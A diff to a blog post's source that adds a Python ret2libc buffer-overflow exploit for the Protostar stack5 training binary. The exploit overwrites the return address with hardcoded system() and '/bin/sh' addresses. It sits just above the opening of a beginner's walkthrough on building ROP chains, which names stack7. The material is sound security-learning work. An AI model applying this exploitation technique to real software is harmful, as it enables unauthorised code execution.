@@ -14,6 +14,34 @@ serie: learn
 comments: true
 ---
 
+test
+```python
+import subprocess
+import struct
+
+
+bin_sh = 0xf7f84a8c
+system = 0xf7e66e70
+
+# First, the buffer overflow.
+payload =  "A"*99
+#overwrite saved ebp
+payload += "BBBB"
+#then overwrite return with system call
+payload += struct.pack('I',system)
+#fake return
+payload+="CCCC"
+#binsh arg for system
+payload+= struct.pack('I',bin_sh)
+
+
+
+print (payload)
+
+p = subprocess.Popen("./stack5", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+p.communicate(payload)
+```
+
 ### Fun with ROP Chains
 
 I wanted to post a walkthrough of building a rop chain exploit for anyone trying to learn out there. There are some very good resources out there, but I wanted to try to combine them in an easy to follow manner to do a basic rop chain exploit. I used protostar stack7 binary for this example.
